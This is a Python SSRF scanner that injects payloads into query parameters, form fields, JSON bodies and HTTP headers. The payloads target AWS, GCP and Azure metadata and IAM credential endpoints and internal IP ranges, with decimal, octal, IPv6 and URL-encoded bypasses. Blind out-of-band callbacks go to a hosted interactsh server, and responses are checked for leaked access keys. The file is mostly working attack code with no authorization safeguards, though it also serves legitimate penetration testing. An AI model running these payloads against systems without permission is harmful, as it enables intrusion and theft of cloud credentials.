"""
SSRF Scanner — Full Rewrite
=============================
Detection methods:
  1. In-band SSRF      — Payload reflected in response (cloud metadata, internal IPs)
  2. Blind SSRF (OOB)  — Uses interactsh to detect server-side fetches that never
                         reflect in the HTTP response (async webhooks, logging, etc.)
  3. JSON body SSRF    — Injects into JSON payloads (webhook_url, callback, etc.)
  4. Header SSRF       — Injects into Referer / X-Forwarded-For / Host headers
  5. IP obfuscation    — IPv6, decimal IP, octal, URL-encoded bypasses

Key improvements over v1:
  - Blind SSRF via interactsh: generates unique OOB callback URLs per injection,
    polls interactsh server to confirm DNS/HTTP callbacks — catches async SSRF
    that never reflects in the response body
  - JSON body injection: many modern APIs accept webhook_url / callback as JSON,
    not query params — v1 completely missed these
  - Header injection: Referer, X-Forwarded-For, Host header SSRF
  - IP bypass variants: decimal (2130706433), octal (0177.0.0.1), IPv6 (::1),
    URL-encoded, and mixed encoding
  - interactsh is optional — falls back to in-band only if not available
"""
from __future__ import annotations

import re
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests


# ---------------------------------------------------------------------------
# Payload banks
# ---------------------------------------------------------------------------

# Internal / metadata endpoints to probe
SSRF_TARGETS: List[Tuple[str, str]] = [
    # AWS
    ("http://169.254.169.254/latest/meta-data/",            "aws_metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/",        "aws_iam"),
    ("http://169.254.169.254/latest/user-data/",            "aws_userdata"),
    # GCP
    ("http://169.254.169.254/computeMetadata/v1/",          "gcp_metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_internal"),
    # Azure
    ("http://169.254.169.254/metadata/instance",            "azure_metadata"),
    # Generic internal
    ("http://127.0.0.1/",                                   "localhost"),
    ("http://localhost/",                                    "localhost_name"),
    ("http://0.0.0.0/",                                     "zero_addr"),
    # IPv6 bypass
    ("http://[::1]/",                                        "ipv6_loopback"),
    ("http://[::ffff:127.0.0.1]/",                          "ipv6_mapped"),
    # Decimal IP bypass (127.0.0.1)
    ("http://2130706433/",                                   "decimal_ip"),
    # Octal bypass
    ("http://0177.0.0.1/",                                   "octal_ip"),
    # URL-encoded bypass
    ("http://%31%32%37%2e%30%2e%30%2e%31/",                 "urlenc_ip"),
    # LAN ranges
    ("http://192.168.0.1/",                                  "lan_gateway"),
    ("http://10.0.0.1/",                                     "rfc1918_10"),
    ("http://172.16.0.1/",                                   "rfc1918_172"),
]

# Response indicators of successful SSRF (in-band)
SSRF_INDICATORS: List[str] = [
    r'"instanceId"\s*:',
    r'"privateIp"\s*:',
    r'"hostname"\s*:\s*"[^"]+',
    r'ami-[a-z0-9]{8,}',
    r'local-ipv4',
    r'instance-id',
    r'computeMetadata',
    r'metadata\.google\.internal',
    r'<title>[^<]*(Apache|nginx|IIS)[^<]*</title>',
    r'root:.*?:/bin/',
    r'"accessKeyId"\s*:',
    r'"secretAccessKey"\s*:',
    r'"Token"\s*:',
    r'iam/security-credentials',
    r'EC2_REGION',
    r'AZ_CLIENT_ID',
]

# Parameter names likely to accept URLs
URL_PARAM_NAMES: List[str] = [
    'url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
    'path', 'redirect', 'endpoint', 'target', 'fetch', 'load',
    'file', 'image', 'img', 'document', 'resource', 'proxy',
    'callback', 'webhook', 'webhook_url', 'next', 'return', 'goto',
    'open', 'data', 'ref', 'site', 'html', 'val', 'validate',
    'domain', 'host', 'port', 'to', 'out', 'view', 'dir',
]

# JSON keys that commonly hold URLs in API bodies
JSON_URL_KEYS: List[str] = [
    'url', 'uri', 'webhook', 'webhook_url', 'callback', 'callback_url',
    'redirect_url', 'success_url', 'failure_url', 'return_url',
    'target', 'endpoint', 'src', 'source', 'destination', 'host',
    'image_url', 'avatar_url', 'icon_url', 'logo_url', 'resource',
]

# Headers that can trigger SSRF
SSRF_HEADERS: List[Tuple[str, str]] = [
    ("Referer",            "{PAYLOAD}"),
    ("X-Forwarded-For",    "{PAYLOAD}"),
    ("X-Forwarded-Host",   "{PAYLOAD}"),
    ("X-Real-IP",          "{PAYLOAD}"),
    ("Client-IP",          "{PAYLOAD}"),
    ("True-Client-IP",     "{PAYLOAD}"),
    ("X-Custom-IP-Authorization", "{PAYLOAD}"),
    ("X-Original-URL",     "{PAYLOAD}"),
    ("X-Rewrite-URL",      "{PAYLOAD}"),
]


# ---------------------------------------------------------------------------
# interactsh wrapper
# ---------------------------------------------------------------------------

class _OOBClient:
    """
    Blind SSRF detection via ProjectDiscovery's hosted interactsh server.
    No binary or Go required — pure HTTP polling.
    """

    REGISTER_URL = "https://oast.pro/register"
    POLL_URL     = "https://oast.pro/poll"

    def __init__(self):
        self._available = False
        self._secret    = None
        self._domain    = None
        self._session   = requests.Session()
        self._session.headers.update({"User-Agent": "vuln-scanner/1.0"})
        self._try_register()

    def _try_register(self):
        try:
            resp = self._session.post(
                self.REGISTER_URL,
                json={"public-key": "", "secret-key": ""},
                timeout=8,
            )
            data = resp.json()
            self._domain    = data.get("domain")
            self._secret    = data.get("secret-key")
            self._available = bool(self._domain)
            if self._available:
                print(f"[SSRF] interactsh registered — domain: {self._domain}")
            else:
                print("[SSRF] interactsh registration failed — blind SSRF disabled")
        except Exception as exc:
            print(f"[SSRF] interactsh unreachable: {exc} — blind SSRF disabled")

    @property
    def available(self) -> bool:
        return self._available

    def get_payload_url(self, tag: str = "") -> str:
        if not self._available:
            return ""
        uid = uuid.uuid4().hex[:8]
        return f"http://{uid}.{self._domain}"

    def poll(self, seconds: int = 8) -> List[Dict]:
        if not self._available or not self._secret:
            return []
        time.sleep(seconds)
        try:
            resp = self._session.get(
                self.POLL_URL,
                params={"id": self._domain, "secret": self._secret},
                timeout=10,
            )
            data = resp.json()
            return data.get("data", []) or []
        except Exception as exc:
            print(f"[SSRF] Poll failed: {exc}")
            return []

    def close(self):
        pass


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class SSRFScanner:
    """
    Multi-method SSRF scanner with optional OOB (blind) detection.

    Detection order:
      1. In-band: inject known internal URLs, check response for indicators
      2. Blind OOB: inject interactsh URLs, poll for DNS/HTTP callbacks
      3. JSON body: inject into common JSON webhook/callback fields
      4. Header injection: Referer, X-Forwarded-For, etc.
    """

    def __init__(self, timeout: int = 10,
                 session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()
        if not session:
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

        self._oob = _OOBClient()

        # Track OOB injections: oob_url -> metadata
        self._oob_injections: Dict[str, Dict] = {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test URL parameters for SSRF."""
        findings: List[Dict[str, Any]] = []
        ssrf_params = self._identify_ssrf_params(params)

        for param in ssrf_params:
            print(f"  [SSRF] Testing param '{param}' on {url}")

            # 1. In-band
            result = self._inband(url, param, params, "GET")
            if result:
                findings.append(result)
                continue

            # 2. Blind OOB
            if self._oob.available:
                self._inject_oob(url, param, params, "GET")

        # 3. Header injection (once per URL)
        result = self._header_injection(url)
        if result:
            findings.append(result)

        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs and JSON bodies for SSRF."""
        findings: List[Dict[str, Any]] = []
        action  = form_data.get("action", "")
        method  = (form_data.get("method") or "GET").upper()
        inputs  = form_data.get("inputs", [])

        if not action or not inputs:
            return findings

        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
        ssrf_params = self._identify_ssrf_params(baseline)

        for param in ssrf_params:
            print(f"  [SSRF] Testing form param '{param}' on {action}")

            # 1. In-band
            result = self._inband(action, param, baseline, method)
            if result:
                findings.append(result)
                continue

            # 2. Blind OOB
            if self._oob.available:
                self._inject_oob(action, param, baseline, method)

        # 3. JSON body injection
        result = self._json_body_ssrf(action, method)
        if result:
            findings.append(result)

        return findings

    def collect_oob_findings(self) -> List[Dict[str, Any]]:
        """
        Poll interactsh for callbacks from all previously injected OOB payloads.
        Call this ONCE after all scan_url / scan_form calls complete.

        Returns a list of confirmed blind SSRF findings.
        """
        if not self._oob.available or not self._oob_injections:
            return []

        print(f"[SSRF] Polling interactsh for OOB callbacks "
              f"({len(self._oob_injections)} injections tracked)...")

        findings: List[Dict[str, Any]] = []
        interactions = self._oob.poll(seconds=8)

        for interaction in interactions:
            raw_url = interaction.get("full-id", "") or interaction.get("unique-id", "")
            # Match callback back to injection metadata
            for oob_url, meta in self._oob_injections.items():
                if raw_url and raw_url in oob_url:
                    print(f"    [!] Blind SSRF confirmed: {meta['url']} "
                          f"param='{meta['param']}' "
                          f"protocol={interaction.get('protocol', 'unknown')}")
                    findings.append({
                        "vulnerable": True,
                        "type":       "blind-ssrf",
                        "param":      meta["param"],
                        "payload":    oob_url,
                        "evidence":   (
                            f"OOB callback received via {interaction.get('protocol','?')} "
                            f"from {interaction.get('remote-address','?')}"
                        ),
                        "confidence": 95,
                        "url":        meta["url"],
                        "oob_url":    oob_url,
                    })
                    break

        self._oob.close()
        return findings

    # ------------------------------------------------------------------
    # Detection method 1: In-band
    # ------------------------------------------------------------------

    def _inband(self, url: str, param: str,
                params: Dict[str, Any], method: str) -> Optional[Dict]:
        for payload_url, label in SSRF_TARGETS:
            data = {**params, param: payload_url}
            text, status = self._fetch(url, data, method)
            if text is None:
                continue

            indicator = self._check_indicators(text)
            if indicator:
                print(f"    [!] In-band SSRF on '{param}' ({label})")
                return {
                    "vulnerable": True,
                    "type":       "ssrf",
                    "param":      param,
                    "payload":    payload_url,
                    "evidence":   f"Response contains: {indicator}",
                    "confidence": 92,
                    "url":        url,
                    "target":     label,
                }

            # Heuristic: 200 OK with internal-sounding keywords
            if status == 200 and self._heuristic_match(text):
                return {
                    "vulnerable": True,
                    "type":       "ssrf",
                    "param":      param,
                    "payload":    payload_url,
                    "evidence":   "Heuristic: status 200 with internal content keywords",
                    "confidence": 60,
                    "url":        url,
                    "target":     label,
                }

        return None

    # ------------------------------------------------------------------
    # Detection method 2: Blind OOB injection (fire-and-forget)
    # ------------------------------------------------------------------

    def _inject_oob(self, url: str, param: str,
                    params: Dict[str, Any], method: str) -> None:
        """Inject an interactsh OOB URL — callback confirmed later via poll."""
        oob_url = self._oob.get_payload_url(tag=param)
        if not oob_url:
            return

        data = {**params, param: oob_url}
        self._fetch(url, data, method)

        # Register for later polling
        self._oob_injections[oob_url] = {"url": url, "param": param}
        print(f"    [OOB] Injected interactsh URL into '{param}': {oob_url}")

    # ------------------------------------------------------------------
    # Detection method 3: JSON body injection
    # ------------------------------------------------------------------

    def _json_body_ssrf(self, url: str, method: str) -> Optional[Dict]:
        """
        POST a JSON body with common webhook/callback keys set to internal URLs.
        Many REST APIs accept URLs only via JSON body — missed by query-param-only scanners.
        """
        if method.upper() not in ("POST", "PUT", "PATCH"):
            # Also try POST even if form is GET — APIs often differ
            method = "POST"

        for key in JSON_URL_KEYS:
            for payload_url, label in SSRF_TARGETS[:6]:  # top 6 most common
                body = {key: payload_url}
                try:
                    resp = self.session.request(
                        method, url,
                        json=body,
                        timeout=self.timeout,
                        headers={**dict(self.session.headers),
                                 "Content-Type": "application/json"},
                    )
                    text = resp.text or ""
                    indicator = self._check_indicators(text)
                    if indicator:
                        print(f"    [!] JSON-body SSRF: key='{key}' payload={label}")
                        return {
                            "vulnerable": True,
                            "type":       "ssrf",
                            "param":      f"json:{key}",
                            "payload":    payload_url,
                            "evidence":   f"Response contains: {indicator}",
                            "confidence": 90,
                            "url":        url,
                            "target":     label,
                            "method":     "json-body",
                        }

                    # OOB for JSON body too
                    if self._oob.available:
                        oob_url = self._oob.get_payload_url(tag=key)
                        if oob_url:
                            self.session.request(
                                method, url,
                                json={key: oob_url},
                                timeout=self.timeout,
                                headers={**dict(self.session.headers),
                                         "Content-Type": "application/json"},
                            )
                            self._oob_injections[oob_url] = {
                                "url":   url,
                                "param": f"json:{key}",
                            }

                except requests.RequestException:
                    continue

        return None

    # ------------------------------------------------------------------
    # Detection method 4: Header injection
    # ------------------------------------------------------------------

    def _header_injection(self, url: str) -> Optional[Dict]:
        """Inject SSRF payloads via common headers (Referer, X-Forwarded-For, etc.)."""
        for header_name, template in SSRF_HEADERS:
            for payload_url, label in SSRF_TARGETS[:5]:
                injected_value = template.replace("{PAYLOAD}", payload_url)
                try:
                    resp = self.session.get(
                        url,
                        timeout=self.timeout,
                        headers={**dict(self.session.headers),
                                 header_name: injected_value},
                    )
                    text = resp.text or ""
                    indicator = self._check_indicators(text)
                    if indicator:
                        print(f"    [!] Header SSRF via {header_name} ({label})")
                        return {
                            "vulnerable": True,
                            "type":       "ssrf",
                            "param":      f"header:{header_name}",
                            "payload":    payload_url,
                            "evidence":   f"Response contains: {indicator}",
                            "confidence": 88,
                            "url":        url,
                            "target":     label,
                            "method":     "header-injection",
                        }

                    # OOB header injection
                    if self._oob.available:
                        oob_url = self._oob.get_payload_url(tag=header_name)
                        if oob_url:
                            self.session.get(
                                url,
                                timeout=self.timeout,
                                headers={**dict(self.session.headers),
                                         header_name: oob_url},
                            )
                            self._oob_injections[oob_url] = {
                                "url":   url,
                                "param": f"header:{header_name}",
                            }

                except requests.RequestException:
                    continue

        return None

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _identify_ssrf_params(self, params: Dict[str, Any]) -> List[str]:
        found = []
        for name, value in params.items():
            name_lower = name.lower()
            if any(kw in name_lower for kw in URL_PARAM_NAMES):
                found.append(name)
                continue
            if value and isinstance(value, str):
                sv = value.strip()
                if sv.startswith(("http://", "https://", "//")):
                    found.append(name)
        return found

    def _fetch(self, url: str, params: Dict[str, Any],
               method: str) -> Tuple[Optional[str], int]:
        try:
            if method.upper() == "GET":
                r = self.session.get(url,  params=params, timeout=self.timeout)
            else:
                r = self.session.post(url, data=params,   timeout=self.timeout)
            return r.text, r.status_code
        except requests.RequestException as exc:
            print(f"    [err] {exc}")
            return None, 0

    def _check_indicators(self, text: str) -> Optional[str]:
        for pattern in SSRF_INDICATORS:
            if re.search(pattern, text, re.IGNORECASE):
                return pattern
        return None

    def _heuristic_match(self, text: str) -> bool:
        keywords = ["instance", "metadata", "internal", "localhost",
                    "169.254", "iam", "credential"]
        t = text.lower()
        return sum(1 for kw in keywords if kw in t) >= 2